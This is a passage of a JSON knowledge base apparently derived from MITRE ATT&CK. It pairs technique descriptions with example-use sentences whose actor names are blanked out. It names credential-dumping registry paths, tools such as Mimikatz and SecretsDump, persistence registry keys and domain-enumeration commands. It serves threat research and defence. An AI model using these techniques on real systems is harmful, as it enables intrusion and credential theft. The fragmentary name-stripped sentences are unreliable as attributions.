default password for the Login Keychain is the current users password to login to the macOS host.(Citation: External to DA, the OS X Way)(Citation: Empire Keychain Decrypt)  ",
    "similar_words": [
      "Keychain"
    ],
    "id": "T1555.001"
  },
  "attack-pattern--1ecb2399-e8ba-4f6b-8ba7-5c27d49405cf": {
    "name": "Boot or Logon Autostart Execution",
    "example_uses": [
      "has added persistence via the Registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\load which causes the malware to run each time any user logs in.",
      "s RAT makes a persistent target file with auto execution on the host start.",
      "has created registry keys for persistence including `HKCU\\Software\\bkfouerioyou` `HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{6afa8072-b2b1-31a8-b5c1-{Unique Identifier}` and `HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{3BF41072-B2B1-31A8-B5C1-{Unique Identifier}`.",
      "established persistence by setting the HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\load registry key to point to its executable.",
      "has created registry keys for persistence including `HKCU\\Software\\dnimtsoleht\\StubPath` `HKCU\\Software\\snimtsOleht\\StubPath` `HKCU\\Software\\Backtsaleht\\StubPath` `HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed. Components\\{3bf41072-b2b1-21c8-b5c1-bd56d32fbda7}` and `HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{3ef41072-a2f1-21c8-c5c1-70c2c3bc7905}`.",
      "has modified the Registry to maintain persistence."
    ],
    "description": "Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.(Citation: Microsoft Run Key)(Citation: MSDN Authentication Packages)(Citation: Microsoft TimeProvider)(Citation: Cylance Reg Persistence Sept 2013)(Citation: Linux Kernel Programming) These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.Since some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.",
    "similar_words": [
      "Boot or Logon Autostart Execution"
    ],
    "id": "T1547"
  },
  "attack-pattern--1ecfdab8-7d59-4c98-95d4-dc41970f57fc": {
    "name": "LSA Secrets",
    "example_uses": [
      "has performed credential dumping with .",
      "Credential Dumper module can dump LSA secrets from registry keys including: `HKLM\\SECURITY\\Policy\\PolEKList\\default` `HKLM\\SECURITY\\Policy\\Secrets\\*\\CurrVal` and `HKLM\\SECURITY\\Policy\\Secrets\\*\\OldVal`.",
      "collects LSA secrets.",
      "can dump LSA secrets.",
      "can perform credential dumping from LSA secrets to obtain account and password information.",
      "actors have used  to dump credentials. They have also dumped credentials from domain controllers.",
      "has used credential dumping tools such as  to steal credentials to accounts logged into the compromised system and to Outlook Web Access.",
      "can dump hashed passwords from LSA secrets for the targeted system.",
      "used several tools for retrieving login and password information including LaZagne.",
      "has used a variety of publicly available tools like  to gather credentials.",
      "has used the `reg save` command to extract LSA secrets offline.",
      "has used a modified version of pentesting tools wmiexec.vbs and secretsdump.py to dump credentials.",
      "has dropped and executed SecretsDump to dump password hashes.",
      "can dump secrets from the Local Security Authority.",
      "SecretsDump and  modules within  can perform credential dumping to obtain account and password information.",
      "can use Lazagne for harvesting credentials.",
      "has dumped credentials including by using gsecdump.",
      "performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways including from the LSA.",
      "has used frameworks such as  to dump LSA secrets for credential capture."
    ],
    "description": "Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.(Citation: Passcape LSA Secrets)(Citation: Microsoft AD Admin Tier Model)(Citation: Tilbury Windows Credentials) LSA secrets are stored in the registry at HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets. LSA secrets can also be dumped from memory.(Citation: ired Dumping LSA Secrets)[Reg](https://attack.mitre.org/software/S0075) can be used to extract from the Registry. [Mimikatz](https://attack.mitre.org/software/S0002) can be used to extract secrets from memory.(Citation: ired Dumping LSA Secrets)",
    "similar_words": [
      "LSA Secrets"
    ],
    "id": "T1003.004"
  },
  "attack-pattern--1f9012ef-1e10-4e48-915e-e03563435fe8": {
    "name": "Weaken Encryption",
    "example_uses": [],
    "description": "Adversaries may compromise a network devices encryption capability in order to bypass encryption that would otherwise protect data communications. (Citation: Cisco Synful Knock Evolution)Encryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.Adversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as [Modify System Image](https://attack.mitre.org/techniques/T1601), [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001), and [Disable Crypto Hardware](https://attack.mitre.org/techniques/T1600/002), an adversary can negatively effect and/or eliminate a devices ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts. (Citation: Cisco Blog Legacy Device Attacks)",
    "similar_words": [
      "Weaken Encryption"
    ],
    "id": "T1600"
  },
  "attack-pattern--1f9c2bae-b441-4f66-a8af-b65946ee72f2": {
    "name": "SAML Tokens",
    "example_uses": [
      "During the   created tokens using compromised SAML signing certificates.",
      "can be used to create SAML tokens using the AD Federated Services token signing certificate."
    ],
    "description": "An adversary may forge SAML tokens with any permissions claims and lifetimes if they possess a valid SAML token-signing certificate.(Citation: Microsoft SolarWinds Steps) The default lifetime of a SAML token is one hour, but the validity period can be specified in the NotOnOrAfter value of the conditions ... element in a token. This value can be changed using the AccessTokenLifetime in a LifetimeTokenPolicy.(Citation: Microsoft SAML Token Lifetimes) Forged SAML tokens enable adversaries to authenticate across services that use SAML 2.0 as an SSO (single sign-on) mechanism.(Citation: Cyberark Golden SAML)An adversary may utilize [Private Keys](https://attack.mitre.org/techniques/T1552/004) to compromise an organization's token-signing certificate to create forged SAML tokens. If the adversary has sufficient permissions to establish a new federation trust with their own Active Directory Federation Services (AD FS) server, they may instead generate their own trusted token-signing certificate.(Citation: Microsoft SolarWinds Customer Guidance) This differs from [Steal Application Access Token](https://attack.mitre.org/techniques/T1528) and other similar behaviors in that the tokens are new and forged by the adversary, rather than stolen or intercepted from legitimate users.An adversary may gain administrative Entra ID privileges if a SAML token is forged which claims to represent a highly privileged account. This may lead to [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Microsoft SolarWinds Customer Guidance)",
    "similar_words": [
      "SAML Tokens"
    ],
    "id": "T1606.002"
  },
  "attack-pattern--208884f1-7b83-4473-ac22-4e1cf6c41471": {
    "name": "Masquerade File Type",
    "example_uses": [
      "During the   masqueraded executables as `.txt` files.",
      "During   disguised malicious template files as JPEG files to avoid detection.",
      "has appended copies of the ntds.dit database with a .gif file extension.",
      "The  payload has been disguised as a PNG file and hidden within LNK files using a Microsoft File Explorer icon.",
      "has been delivered through a LNK file disguised as a folder.",
      "has used Microsoft Word icons to hide malicious LNK files.",
      "has been disguised as a .jpg file.",
      "has disguised it's true file structure as an application bundle by adding special characters to the filename and using the icon for legitimate Word documents.",
      "has historically been delivered via infected USB drives containing a malicious LNK object masquerading as a legitimate folder.",
      "masquerades as a Microsoft Word Add-In file with the extension `.wll` but is a malicious DLL file.",
      "masqueraded configuration files containing encryption keys as PNG files.",
      "has used payloads that resemble benign file extensions such as .mp3 .accdb and .pub though the files contained malicious JavaScript content.",
      "can download additional executable payloads that masquerade as GIF files.",
      "has been distributed as a DLL/HTML polyglot file."
    ],
    "description": "Adversaries may masquerade malicious payloads as legitimate files through changes to the payload's formatting, including the files signature, extension, icon, and contents. Various file types have a typical standard format, including how they are encoded and organized. For example, a files signature (also known as header or magic bytes) is the beginning bytes of a file and is often used to identify the files type. For example, the header of a JPEG file,  is  0xFF 0xD8 and the file extension is either `.JPE`, `.JPEG` or `.JPG`. Adversaries may edit the headers hex code and/or the file extension of a malicious payload in order to bypass file validation checks and/or input sanitization. This behavior is commonly used when payload files are transferred (e.g., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and stored (e.g., [Upload Malware](https://attack.mitre.org/techniques/T1608/001)) so that adversaries may move their malware without triggering detections. Common non-executable file types and extensions, such as text files (`.txt`) and image files (`.jpg`, `.gif`, etc.) may be typically treated as benign.  Based on this, adversaries may use a file extension to disguise malware, such as naming a PHP backdoor code with a file name of test.gif. A user may not know that a file is malicious due to the benign appearance and file extension.Polygot files, which are files that have multiple different file types and that function differently based on the application that will execute them, may also be used to disguise malicious malware and capabilities.(Citation: polygot_icedID)",
    "similar_words": [
      "Masquerade File Type"
    ],
    "id": "T1036.008"
  },
  "attack-pattern--212306d8-efa4-44c9-8c2d-ed3d2e224aa0": {
    "name": "Malware",
    "example_uses": [
      "has developed its own unique malware such as MailFetch.py for use in operations.",
      "has utilized custom malware to maintain persistence in a compromised environment.",
      "has developed malware for their operations including ransomware such as  and .",
      "During  threat actors developed their own custom webshells to upload to compromised servers.",
      "has developed custom malware for use in their operations.",
      "has used unique malware for information theft and exfiltration.",
      "has developed malware for its operations including malicious mobile applications and destructive malware such as  and .",
      "has used unique malware in many of their operations.",
      "has used custom malware including  and  in their operations.",
      "For the   used numerous pieces of malware that were likely developed for or by the group including    and .",
      "has created customized tools and payloads for functions including ARP poisoning encryption credential dumping ASP.NET shells web backdoors process enumeration WMI querying HTTP and SMB communications network interface sniffing and keystroke logging.",
      "For   used new strains of malware including    and .",
      "has built malware such as  and  for targeting victims' machines.",
      "In the   developed prior to the attack malware capabilities that would require access to specific and specialized hardware and software.",
      "For  UNC3890 actors used unique malware including  and .",
      "has developed its own unique malware for use in operations.",
      "For  the threat actors used custom malware including   and .",
      "For  the threat actors used the  modular backdoor.",
      "has developed custom malware that allowed them to maintain persistence on victim networks.",
      "For   developed custom tools such as Sumarta DBLL Dropper  and  for their operations.",
      "has developed custom malware such as .",
      "has developed malware for use in operations including the creation of infected removable media.",
      "has developed custom malware including a malware delivery mechanism masquerading as a legitimate game.",
      "developed and employ  ransomware.",
      "has created its own tools to use during operations.",
      "involved the development of a new web shell variant .",
      "actively developed and used a series of downloaders during 2022.",
      "has used custom tooling including .",
      "featured the development and deployment of two unique malware types  and .",
      "For   improved on  by developing the  backdoor.",
      "For   created new implants including the  backdoor."
    ],
    "description": "Adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: ActiveMalwareEnergy)(Citation: FBI Flash FIN7 USB)As with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.Some aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of [Web Services](https://attack.mitre.org/techniques/T1583/006).(Citation: FireEye APT29)",
    "similar_words": [
      "Malware"
    ],
    "id": "T1587.001"
  },
  "attack-pattern--215d9700-5881-48b8-8265-6449dbb7195d": {
    "name": "Device Driver Discovery",
    "example_uses": [
      "can enumerate device drivers located in the registry at `HKLM\\Software\\WBEM\\WDM`.",
      "has a plugin to detect active drivers of some security products.",
      "can verify the presence of specific drivers on compromised hosts including Microsoft Print to PDF and Microsoft XPS Document Writer."
    ],
    "description": "Adversaries may attempt to enumerate local device drivers on a victim host. Information about device drivers may highlight various insights that shape follow-on behaviors, such as the function/purpose of the host, present security tools (i.e. [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001)) or other defenses (e.g., [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)), as well as potential exploitable vulnerabilities (e.g., [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)).Many OS utilities may provide information about local device drivers, such as `driverquery.exe` and the `EnumDeviceDrivers()` API function on Windows.(Citation: Microsoft Driverquery)(Citation: Microsoft EnumDeviceDrivers) Information about device drivers (as well as associated services, i.e., [System Service Discovery](https://attack.mitre.org/techniques/T1007)) may also be available in the Registry.(Citation: Microsoft Registry Drivers)On Linux/macOS, device drivers (in the form of kernel modules) may be visible within `/dev` or using utilities such as `lsmod` and `modinfo`.(Citation: Linux Kernel Programming)(Citation: lsmod man)(Citation: modinfo man)",
    "similar_words": [
      "Device Driver Discovery"
    ],
    "id": "T1652"
  },
  "attack-pattern--21875073-b0ee-49e3-9077-1e2a885359af": {
    "name": "Domain Account",
    "example_uses": [
      "During the   used PowerShell to discover domain accounts by exectuing `Get-ADUser` and `Get-ADGroupMember`.",
      "can enumerate domain accounts via net.exe user /domain.",
      "commands used with the /domain flag can be used to gather information about and manipulate user accounts on the current domain.",
      "can identify user accounts associated with a Service Principal Name and query Service Principal Names within the domain by utilizing the following scripts: `GetUserSPNs.vbs` and `querySpn.vbs`.",
      "has the ability to identify domain administrator accounts.",
      "has used Metasploits  NTDSGRAB module to obtain a copy of the victim's Active Directory database.",
      "can enumerate the domain user accounts on a targeted system.",
      "used built-in net commands to enumerate domain administrator users.",
      "performs account discovery using commands such as net localgroup administrators and net group REDACTED /domain on specific permissions groups.",
      "leverages legitimate domain accounts to gain access to the target environment.",
      "may use net group domain admins /domain to display accounts in the domain admins permissions group and net localgroup administrators to list local system administrator group membership.",
      "has the ability to execute an LDAP query to enumerate the distinguished name SAM account name and display name for all domain users.",
      "has used cmd.exe net user /domain to enumerate domain users.",
      "can be used to gather information on user accounts within a domain.",
      "can utilize `net use` commands to identify domain users.",
      "can collect information about domain users including identification of domain admin accounts.",
      "has used the AD Explorer tool to enumerate users on a victim's network.",
      "has has used net user /dom and net user Administrator to enumerate domain accounts including administrator accounts.",
      "can acquire local and domain user account information.",
      "has used the Microsoft administration tool csvde.exe to export Active Directory data.",
      "has run net user net user /domain net group domain admins /domain and net group Exchange Trusted Subsystem /domain to get account listings on a victim.",
      "can enumerate local and domain user account information.",
      "may collect user account information by running net user /domain or a series of other commands on a victim.",
      "has run `net user %USER% /dom` for account discovery.",
      "has used net user /domain to enumerate domain accounts.",
      "During  the threat actors used the `dsquery` and `dsget` commands to get domain environment information and to query users in administrative groups.",
      "can use `System.Security.AccessControl` namespaces to retrieve domain user information.",
      "has identified domain admins through the use of `net group Domain admins /DOMAIN`.  has also leveraged the PowerShell cmdlet `Get-ADComputer` to collect account names from Active Directory data.",
      "has used the Softerra LDAP browser to browse documentation on service accounts.",
      "enumerates user accounts of the domain.",
      "During  threat actors used the `net` command to retrieve information about domain accounts.",
      "During   queried compromised victim's active directory servers to obtain the list of employees including administrator accounts.",
      "can determine if the user on an infected machine is in the admin or domain admin group.",
      "can query LDAP to identify additional users on the network to infect.",
      "can use LDAP queries `net group Domain Admins /domain` and `net user /domain` for discovery.",
      "searches for administrator accounts on both the local victim machine and the network.",
      "enumerates local and domain users",
      "gathers domain and account names/information through process monitoring.",
      "has the ability to enumerate domain admin accounts.",
      "The  Active Directory Querier module can perform authenticated requests against an Active Directory server.",
      "has run `net group /dom` and `net group Domain Admins /dom` in compromised environments for account discovery.",
      "has used a tool to query Active Directory using LDAP discovering information about usernames listed in AD.",
      "has used net user /domain to identify account information.",
      "has used batch scripts to enumerate users on a victim domain controller.",
      "can enumerate domain users.",
      "can enumerate domain accounts.",
      "includes modules for collecting information on Active Directory domain accounts.",
      "has scanned for domain admin accounts in compromised environments.",
      "can query LDAP and can use built-in `net` commands to identify additional users on the network to infect.",
      "has collected information about domain accounts using SysInternals AdExplorer functionality  .",
      "can run `C:\\Windows\\System32\\cmd.exe /c net group Domain Admins /domain` to identify domain administrator accounts.",
      "has used `net` commands and tools such as  to profile domain accounts associated with victim machines and make Active Directory queries.",
      "has used tools such as  to identify and enumerate domain accounts.",
      "has performed domain account enumeration during intrusions."
    ],
    "description": "Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior such as targeting specific accounts which possess particular privileges.Commands such as net user /domain and net group /domain of the [Net](https://attack.mitre.org/software/S0039) utility, dscacheutil -q group on macOS, and ldapsearch on Linux can list domain users and groups. [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets including Get-ADUser and Get-ADGroupMember may enumerate members of Active Directory groups.(Citation: CrowdStrike StellarParticle January 2022)  ",
    "similar_words": [
      "Domain Account"
    ],
    "id": "T1087.002"
  },
  "attack-pattern--22522668-ddf6-470b-a027-9d6866679f67": {
    "name": "Active Setup",
    "example_uses": [
      "creates a Registry key in the Active Setup pointing to a malicious executable."
    ],
    "description": "Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer.(Citation: Klein Active Setup 2010) These programs will be executed under the context of the user and will have the account's associated permissions level.Adversaries may abuse Active Setup by creating a key under  HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\ and setting a malicious value for StubPath. This value will serve as the program that will be executed when a user logs into the computer.(Citation: Mandiant Glyer APT 2010)(Citation: Citizenlab Packrat 2015)(Citation: FireEye CFR Watering Hole 2012)(Citation: SECURELIST Bright Star 2015)(Citation: paloalto Tropic Trooper 2016)Adversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.",
    "similar_words": [
      "Active Setup"
    ],
    "id": "T1547.014"
  },
  "attack-pattern--22905430-4901-4c2a-84f6-98243cb173f8": {
    "name": "Hide Artifacts",
    "example_uses": [
      "has used the mktemp utility to make random and unique filenames for payloads such as export tmpDir=$(mktemp -d /tmp/XXXXXXXXXXXX) or mktemp -t Installer.",
      "uses the mktemp utility to make unique file and directory names for payloads such as TMP_DIR=`mktemp -d -t x.",
      "can masquerade the Process Environment Block on a compromised host to hide it's attempts to elevate privileges through `IFileOperation`.",
      "has used `%HiddenReg%` and `%HiddenKey%` as part of its persistence via the Windows registry.",
      "is able to create hidden scheduled tasks by deleting the Security Descriptor (`SD`) registry value.",
      "can masquerade the Process Environment Block on a compromised host to hide its attempts to elevate privileges through `IFileOperation`."
    ],
    "description": "Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)Adversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)",
    "similar_words": [
      "Hide Artifacts"
    ],
    "id": "T1564"
  },
  "attack-pattern--232a7e42-cd6e-4902-8fe9-2960f529dd4d": {
    "name": "Dynamic Data Exchange",
    "example_uses": [
      "has been delivered using OLE objects in malicious documents.",
      "During  threat actors sent malicious Word OLE documents to victims.",
      "has used an OLE object that uses Equation Editor to drop the embedded shellcode.",
      "has sent malicious Word OLE compound documents to victims.",
      "spear phishing campaigns have included malicious Word documents with DDE execution.",
      "has used malware that can execute PowerShell scripts via DDE.",
      "has used the ActiveXObject utility to create OLE objects to obtain execution through Internet Explorer.",
      "can search for specific strings within browser tabs using a Dynamic Data Exchange mechanism.",
      "has delivered  and  by executing PowerShell commands through DDE in Word documents.",
      "can execute tasks via OLE.",
      "was delivered with documents using DDE to execute malicious code.",
      "has used Windows DDE for execution of commands and a malicious VBS.",
      "can use DDE to execute additional payloads on compromised hosts.",
      "attempted to exploit Microsofts DDE protocol in order to gain access to victim machines and for execution.",
      "has utilized OLE as a method to insert malicious content inside various phishing documents.",
      "has executed OLE objects using Microsoft Equation Editor to download and run malicious payloads.",
      "uses the Dynamic Data Exchange (DDE) protocol to download remote payloads.",
      "has been delivered via Word documents using DDE for execution.",
      "has leveraged malicious Word documents that abused DDE.",
      "leveraged the DDE protocol to deliver their malware."
    ],
    "description": "Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by [Component Object Model](https://attack.mitre.org/techniques/T1559/001), DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.(Citation: BleepingComputer DDE Disabled in Word Dec 2017)(Citation: Microsoft ADV170021 Dec 2017)(Citation: Microsoft DDE Advisory Nov 2017)Microsoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros.(Citation: SensePost PS DDE May 2016)(Citation: Kettle CSV DDE Aug 2014)(Citation: Enigma Reviving DDE Jan 2018)(Citation: SensePost MacroLess DDE Oct 2017) Similarly, adversaries may infect payloads to execute applications and/or commands on a victim device by way of embedding DDE formulas within a CSV file intended to be opened through a Windows spreadsheet program.(Citation: OWASP CSV Injection)(Citation: CSV Excel Macro Injection )DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). DDE execution can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)",
    "similar_words": [
      "Dynamic Data Exchange"
    ],
    "id": "T1559.002"
  },
  "attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e": {
    "name": "Malicious File",
    "example_uses": [
      "has relied on users to execute .zip file attachments containing malicious URLs.",
      "has relied on victims clicking a malicious document for execution.",
      "has relied on a victim to enable malicious macros within an attachment delivered via email.",
      "has attempted to get victims to open malicious Microsoft Word and PDF attachment sent via spearphishing.",
      "has attempted to lure targets into downloading an attached executable (ZIP RAR or CAB archives) or document (PDF or other MS Office format).",
      "has used attempted to lure victims into opening malicious e-mail attachments.",
      "has relied on users opening malicious attachments delivered through spearphishing to execute malware.",
      "requires the user to click on the malicious Word document to execute the next part of the attack.",
      "has relied on users clicking a malicious attachment delivered through spearphishing.",
      "has leveraged multiple types of spearphishing in order to attempt to get a user to open attachments.",
      "has used weaponized documents in e-mail to compromise targeted systems.",
      "has used various forms of spearphishing in attempts to get users to open malicious attachments.",
      "has attempted to lure users into opening malicious MS Word and Excel files to execute malicious payloads.",
      "has relied on a victim to open a malicious attachment within an email for execution.",
      "can display an RTF document to the user to enable execution of  stage shellcode.",
      "has attempted to lure victims into opening e-mail attachments to execute malicious code.",
      "has lured victims into opening weaponized documents fake external drives and fake antivirus to execute malicious payloads.",
      "has been executed through malicious e-mail attachments",
      "has used malicious Microsoft Word documents sent via email which prompted the victim to enable macros.",
      "has used spearphishing attachments to infect victims.",
      "has prompted victims to accept macros in order to execute the subsequent payload.",
      "has relied upon users clicking on a malicious attachment delivered through spearphishing.",
      "requires the user to double-click the executable to run the malicious HTA file or to download a malicious installer.",
      "has relied on a user opening a malicious document for execution.",
      "has lured users into opening malicious files delivered via social media.",
      "sent victims a lure document with a warning that asked victims to enable content for execution.",
      "has lured victims into executing malware via malicious e-mail attachments.",
      "makes their malware look like Flash Player Office or PDF documents in order to entice a user to click on it.",
      "has been executed through malicious files attached to e-mails.",
      "has sent malware that required users to hit the enable button in Microsoft Excel to allow an .iqy file to be downloaded.",
      "has attempted to get users to open malicious files by sending spearphishing emails with attachments to victims.",
      "During  the threat actors relied on potential victims to open a malicious Microsoft Word document sent via email.",
      "has attempted to get victims to open malicious files such as Windows Shortcuts (.lnk) and/or Microsoft Office documents sent via email as part of spearphishing campaigns.",
      "has prompted users to enable macros within spearphishing attachments to install malware.",
      "has relied on victim's executing malicious file attachments delivered via email or embedded within actor-controlled websites to deliver malware.",
      "has used malicious files including VBS LNK and HTML for execution.",
      "has been executed through luring victims into opening malicious documents.",
      "has used malicious e-mail attachments to lure victims into executing malware.",
      "has lured victims into opening malicious files containing malware.",
      "relies on a victim to click on a malicious document for initial execution.",
      "has gained execution through luring victims into opening malicious files.",
      "has gained execution through users opening malicious attachments.",
      "During  the threat actors relied on a victim to enable macros within a malicious Microsoft Word document likely sent via email.",
      "has attempted to lure victims into opening malicious attachments delivered via spearphishing.",
      "has attempted to convince victims to enable malicious content within a spearphishing email by including an odd decoy message.",
      "has sent spearphishing attachments attempting to get a user to open them.",
      "During  the threat actors relied on a victim to open a PDF document and click on an embedded malicious link to download malware.",
      "has gained execution through victims opening malicious executable files embedded in zip archives.",
      "has lured users to open malicious email attachments.",
      "has attempted to get users to execute compromised installation files for legitimate software including compression applications security software browsers file recovery applications and other tools and utilities.",
      "has used lures to get users to enable content in malicious attachments and execute malicious files contained in archives. For example  makes their malware look like legitimate Microsoft Word documents .pdf and/or .lnk files.",
      "During  the threat actors relied on users to enable macros within a malicious Microsoft Word document.",
      "has gained execution through user interaction with a malicious file.",
      "has sent spearphishing emails in an attempt to lure users to click on a malicious attachment.",
      "has relied on users to execute malicious files in order to gain execution on victim machines.",
      "has gained execution through malicious attachments.",
      "used malicious e-mail attachments to lure victims into executing LNK files.",
      "attempted to get users to click on an embedded macro within a Microsoft Office Excel document to launch their malware.",
      "has been executed via Microsoft Word documents containing malicious macros.",
      "has lured victims to execute malware with spearphishing attachments containing macros to download either  Bokbot  or .",
      "has infected victims via malicious attachments.",
      "has relied on users mounting and executing a malicious DMG file.",
      "has delivered macro-enabled documents that required targets to click the enable content button to execute the payload on the system.",
      "has tricked unwitting recipients into clicking on spearphishing attachments and enabling malicious macros embedded within files.",
      "has attempted to lure victims into opening malicious email attachments.",
      "has relied on victims' opening a malicious file for initial execution.",
      "has lured victims to launch malicious attachments delivered via spearphishing emails (often sent from compromised accounts).",
      "has sent emails containing malicious attachments that require users to execute a file or macro to infect the victim machine.",
      "relies on users clicking on an embedded image to execute the scripts.",
      "has relied upon users to execute a malicious attachment delivered via spearphishing.",
      "has been executed via malicious MS Word e-mail attachments.",
      "has been delivered via malicious documents with embedded macros.",
      "has been spread through Word documents containing malicious macros.",
      "can gain execution through the download of visual basic files.",
      "has been executed via compromised installation files for legitimate software including compression applications security software browsers file recovery applications and other tools and utilities.",
      "has attempted to get users to launch malicious documents to deliver its payload.",
      "A Word document delivering  prompts the user to enable macro execution.",
      "lured victims into clicking malicious files for machine reconnaissance and to execute malware.",
      "has gained execution through victims clicking on malicious LNK files contained within ISO files which can execute hidden DLLs within the ISO.",
      "has been downloaded and executed from malicious Excel files.",
      "has lured victims into executing malicious files.",
      "lures victims into executing malicious macros embedded within Microsoft Excel documents.",
      "has been executed through Word documents with malicious embedded macros.",
      "has been executed through users being lured into opening malicious e-mail attachments.",
      "has relied on users clicking a malicious attachment delivered through spearphishing.",
      "has relied on victims to open a malicious attachment delivered via email.",
      "During   relied on a student target to open a malicious document delivered via email.",
      "During   lured victims into executing malicious documents that contained dream job descriptions from defense aerospace and other sectors.",
      "has relied on a user to open a malicious document or archived file delivered via email for initial execution.",
      "has been executed via malicious e-mail attachments.",
      "has attempted to get users to launch a malicious Microsoft Word attachment delivered via a spearphishing email.",
      "has used malicious documents to lure victims into allowing execution of PowerShell scripts.",
      "During the   leveraged Microsoft Office attachments which contained malicious macros that were automatically executed once the user permitted them.",
      "has relied on victims opening a malicious Excel file for execution.",
      "embedded a malicious macro in a Word document and lured the victim to click on an icon to execute the malware.",
      "has relied on users to execute malicious file attachments delivered via spearphishing emails.",
      "has been executed by luring victims to open malicious e-mail attachments.",
      "has used malicious .exe or .dll files disguised as documents or images.",
      "has attempted to get victims to open malicious Microsoft Word attachment sent via spearphishing.",
      "lured victims to double-click on images in the attachments they sent which would then execute the hidden LNK file.",
      "has relied upon users clicking on a malicious attachment delivered through spearphishing.",
      "has been executed through user installation of an executable disguised as a flash installer.",
      "as attempted to lure victims into clicking on malicious attachments within spearphishing emails.",
      "has lured victims into opening macro-enabled Word documents for execution.",
      "has lured victims into executing malicious macros embedded within Microsoft Office documents.",
      "has relied on users opening a malicious email attachment for execution.",
      "has attempted to get users to execute a malicious .app file that looks like a Flash Player update.",
      "has relied on a user to execute a malicious attachment delivered via spearphishing.",
      "attempted to get users to click on Microsoft Office attachments containing malicious macro scripts.",
      "has achieved execution by luring users to click on a file that appeared to be an Adobe Flash Player update installer.",
      "attempted to get users to launch malicious Microsoft Office attachments delivered via spearphishing emails.",
      "attempted to get users to launch malicious attachments delivered via spearphishing emails.",
      "has used macro-enabled MS Word documents to lure victims into executing malicious payloads.",
      "has relied on users enabling malicious macros within Microsoft Excel and Word attachments.",
      "initial infection payloads can masquerade as pirated media content requiring user interaction for code execution.  is distributed through phishing links to VBS or MSI objects requiring user interaction for execution.",
      "has used lure documents to convince the user to enable macros.",
      "required users to click on a malicious file for the loader to activate.",
      "has been executed from malicious Excel or Word documents containing macros.",
      "has attempted to lure victims into clicking on malicious embedded archive files sent via spearphishing campaigns.",
      "malicious spearphishing attachments required a user to open the file after receiving.",
      "has sent spearphishing attachments attempting to get a user to click.",
      "has relied on user interaction to open their malicious RTF documents.",
